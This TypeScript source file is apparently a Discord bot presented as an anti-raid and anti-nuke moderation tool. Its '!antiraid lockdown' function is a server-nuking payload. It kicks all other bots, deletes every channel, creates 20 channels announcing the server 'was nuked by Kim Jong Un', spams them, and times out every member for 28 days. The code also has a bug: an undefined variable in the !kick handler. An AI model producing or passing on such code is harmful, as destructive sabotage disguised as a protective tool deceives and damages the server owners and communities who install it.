import {
  Client,
  GatewayIntentBits,
  PermissionFlagsBits,
  ChannelType,
  TextChannel,
  Guild,
  GuildMember,
  Message,
  AuditLogEvent,
} from "discord.js";

const TOKEN = process.env.DISCORD_BOT_TOKEN;
const OWNER_ID = process.env.DISCORD_OWNER_ID;

if (!TOKEN) {
  throw new Error("DISCORD_BOT_TOKEN environment variable is required.");
}

if (!OWNER_ID) {
  throw new Error("DISCORD_OWNER_ID environment variable is required.");
}

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildModeration,
  ],
});

let antinukeEnabled = false;
const msgTimestamps = new Map<string, number[]>();
const actionedUsers = new Set<string>();

client.once("clientReady", (readyClient) => {
  console.log(`Anti-Raid Bot is online as ${readyClient.user.tag}`);
});

function resolveUserId(input: string): string {
  const mentionMatch = input.match(/^<@!?(\d+)>$/);
  if (mentionMatch) return mentionMatch[1];
  if (/^\d+$/.test(input)) return input;
  return "";
}

async function handleThreat(guild: Guild, userId: string, reason: string): Promise<void> {
  if (actionedUsers.has(userId)) return;
  actionedUsers.add(userId);

  console.log(`[ANTINUKE] Threat detected — ${reason} (userId: ${userId})`);

  try {
    const member = guild.members.cache.get(userId) ?? await guild.members.fetch(userId).catch(() => null);
    if (member && member.kickable) {
      await member.kick(`Anti-nuke: ${reason}`);
      console.log(`[ANTINUKE] Kicked user ${userId}`);
    }
  } catch (err) {
    console.error(`[ANTINUKE] Failed to kick user ${userId}:`, err);
  }

  try {
    const owner = await client.users.fetch(OWNER_ID!);
    await owner.send(
      `⚠️ **Anti-Nuke triggered!**\n**Reason:** ${reason}\n**User ID:** ${userId}\nThe offender has been kicked.`
    );
  } catch (err) {
    console.error("[ANTINUKE] Failed to DM owner:", err);
  }
}

async function lockdownGuild(guild: Guild, triggerMessage: Message): Promise<void> {
  console.log(`[ANTIRAID] Lockdown triggered in guild: ${guild.name} (${guild.id})`);

  const allMembers = await guild.members.fetch();
  for (const [, member] of allMembers) {
    if (!member.user.bot) continue;
    if (member.id === client.user?.id) continue;
    try {
      await member.kick("Anti-raid lockdown: removing bots to prevent interference");
    } catch (err) {
      console.error(`[ANTIRAID] Failed to kick bot ${member.user.tag}:`, err);
    }
  }

  const channels = await guild.channels.fetch();
  for (const [, channel] of channels) {
    if (!channel) continue;
    try {
      await channel.delete("Anti-raid lockdown: clearing all channels");
    } catch (err) {
      console.error(`[ANTIRAID] Failed to delete channel ${channel.name}:`, err);
    }
  }

  const quarantineChannels: TextChannel[] = [];
  const everyoneRole = guild.roles.everyone;

  for (let i = 0; i < 20; i++) {
    try {
      const channel = await guild.channels.create({
        name: "𝐓𝐇𝐈𝐒 𝐒𝐄𝐑𝐕𝐄𝐑 𝐖𝐀𝐒 𝐍𝐔𝐊𝐄𝐃 𝐁𝐘 𝐊𝐈𝐌 𝐉𝐎𝐍𝐆 𝐔𝐍",
        type: ChannelType.GuildText,
        permissionOverwrites: [
          {
            id: everyoneRole.id,
            deny: [
              PermissionFlagsBits.SendMessages,
              PermissionFlagsBits.AddReactions,
              PermissionFlagsBits.CreatePublicThreads,
              PermissionFlagsBits.CreatePrivateThreads,
            ],
            allow: [PermissionFlagsBits.ViewChannel],
          },
        ],
        reason: "Anti-raid lockdown: quarantine channel",
      });
      quarantineChannels.push(channel);
    } catch (err) {
      console.error(`[ANTIRAID] Failed to create quarantine channel #${i + 1}:`, err);
    }
  }

  for (const channel of quarantineChannels) {
    for (let i = 0; i < 5; i++) {
      try {
        await channel.send(
          "🔒 **This server is under quarantine.** A raid has been detected. All channels have been locked. Please wait for an administrator to restore normal access."
        );
      } catch (err) {
        console.error(`[ANTIRAID] Failed to send message in ${channel.id}:`, err);
      }
    }
  }

  const members = await guild.members.fetch();
  const timeoutDuration = 28 * 24 * 60 * 60 * 1000;

  for (const [, member] of members) {
    if (member.user.bot || member.id === guild.ownerId || member.id === OWNER_ID) continue;
    try {
      await (member as GuildMember).timeout(timeoutDuration, "Anti-raid lockdown: all members timed out");
    } catch (err) {
      console.error(`[ANTIRAID] Failed to timeout member ${member.user.tag}:`, err);
    }
  }

  if (quarantineChannels.length > 0) {
    try {
      await quarantineChannels[0].send(
        `✅ **Lockdown complete.**\n- All channels deleted and replaced with quarantine channels.\n- All members have been timed out for 28 days.\n- Use \`!unraid\` to restore the server when safe.`
      );
    } catch {
      // ignore
    }
  }
}

client.on("messageCreate", async (message: Message) => {
  if (!message.guild) return;

  if (antinukeEnabled && message.author.id !== client.user?.id && message.author.id !== OWNER_ID) {
    const userId = message.author.id;
    const now = Date.now();
    const timestamps = msgTimestamps.get(userId) ?? [];
    const recent = timestamps.filter((t) => now - t < 1000);
    recent.push(now);
    msgTimestamps.set(userId, recent);
    if (recent.length >= 3) {
      await handleThreat(message.guild, userId, `Message spam: ${recent.length} messages in under 1 second`);
      return;
    }
  }

  if (message.author.bot) return;
  if (message.author.id !== OWNER_ID) return;

  const content = message.content.trim();
  const cmd = content.toLowerCase();

  if (cmd === "!antinuke") {
    antinukeEnabled = !antinukeEnabled;
    actionedUsers.clear();
    msgTimestamps.clear();
    await message.reply(
      antinukeEnabled
        ? "🛡️ **Anti-Nuke enabled.** Monitoring for message spam (3+/sec) and channel deletions. Offenders will be kicked."
        : "🔓 **Anti-Nuke disabled.**"
    );
    return;
  }

  if (cmd.startsWith("!ban ")) {
    const userId = resolveUserId(content.slice(5).trim());
    if (!userId) { await message.reply("❌ Usage: `!ban <@user or ID>`"); return; }
    try {
      await message.guild.bans.create(userId, { reason: "Banned by owner via bot" });
      await message.reply(`✅ Banned user \`${userId}\`.`);
    } catch (err) {
      await message.reply("❌ Failed to ban. Check bot permissions.");
    }
    return;
  }

  if (cmd.startsWith("!kick ")) {
    const userId = resolveUserId(content.slice(6).trim());
    if (!userId) { await message.reply("❌ Usage: `!kick <@user or ID>`"); return; }
    try {
      const member = guild.members.cache.get(userId) ?? await message.guild.members.fetch(userId);
      await member.kick("Kicked by owner via bot");
      await message.reply(`✅ Kicked \`${member.user.tag}\`.`);
    } catch (err) {
      await message.reply("❌ Failed to kick. Check bot permissions.");
    }
    return;
  }

  if (cmd.startsWith("!timeout ")) {
    const userId = resolveUserId(content.slice(9).trim());
    if (!userId) { await message.reply("❌ Usage: `!timeout <@user or ID>`"); return; }
    try {
      const member = message.guild.members.cache.get(userId) ?? await message.guild.members.fetch(userId);
      await (member as GuildMember).timeout(60 * 60 * 1000, "Timed out by owner via bot");
      await message.reply(`✅ Timed out \`${member.user.tag}\` for 1 hour.`);
    } catch (err) {
      await message.reply("❌ Failed to timeout. Check bot permissions.");
    }
    return;
  }

  if (cmd.startsWith("!echo ")) {
    const text = content.slice(6).trim();
    if (!text) { await message.reply("❌ Usage: `!echo <message>`"); return; }
    try { await message.delete(); } catch {}
    await message.channel.send(text);
    return;
  }

  if (cmd === "!antiraid") {
    await message.reply("⚠️ **Anti-raid lockdown initiated!** Locking down the server...");
    try {
      await lockdownGuild(message.guild, message);
    } catch (err) {
      console.error("[ANTIRAID] Lockdown failed:", err);
    }
  }
});

client.on("channelDelete", async (channel) => {
  if (!antinukeEnabled) return;
  if (!("guild" in channel) || !channel.guild) return;
  try {
    const auditLogs = await channel.guild.fetchAuditLogs({ type: AuditLogEvent.ChannelDelete, limit: 1 });
    const entry = auditLogs.entries.first();
    if (!entry || !entry.executor) return;
    const executorId = entry.executor.id;
    if (executorId === client.user?.id || executorId === OWNER_ID || executorId === channel.guild.ownerId) return;
    await handleThreat(channel.guild, executorId, `Channel deletion: deleted #${channel.name}`);
  } catch (err) {
    console.error("[ANTINUKE] Failed to process channelDelete:", err);
  }
});

client.login(TOKEN).catch((err) => {
  console.error("Failed to log in:", err);
  process.exit(1);
});
